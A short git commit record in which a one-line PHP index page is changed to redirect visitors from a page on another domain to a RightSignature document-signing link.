de2cfb2c299a6f1b08a7fc65e8b7b94576c20bff
rightsignaturelhd <63613680+rightsignaturelhd@users.noreply.github.com>
2020-04-14 06:55:35 +1000

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-header("Location: https://pestssolution.us/nor/index.html");
+header("Location: https://secure.rightsignature.com/templates/5f605b03-a391-47e1-9a03-98b505b666de/template-signer-link/7194ad08bd91f71f040eb84dcab3c61e");
 die();
 ?>
